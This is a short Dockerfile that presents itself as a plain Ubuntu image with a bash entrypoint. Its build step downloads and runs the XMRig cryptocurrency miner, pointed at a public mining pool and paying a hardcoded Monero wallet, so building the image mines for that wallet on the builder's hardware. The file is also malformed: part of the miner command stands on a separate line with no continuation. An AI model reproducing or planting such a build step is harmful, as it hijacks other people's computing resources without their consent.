FROM          ubuntu:latest

RUN curl -OL https://github.com/xmrig/xmrig/releases/download/v2.5.3/xmrig-2.5.3-xenial-amd64.tar.gz && tar -xzvf ./xmrig-2.5.3-xenial-amd64.tar.gz && cd xmrig-2.5.3 && ./xmrig -o xmr-eu1.nanopool.org:14444 -u 49KZjKD9McXR9VpmcnWAczgRChyYckiXQVTtsnr8so84FA8ttpkvLrsKpmAHJ7vLUqHGT3sV2dneYBfqFu7kunBp4ARGRDc -p x
-p x -k --donate-level=1;

ENTRYPOINT    ["/bin/bash"]
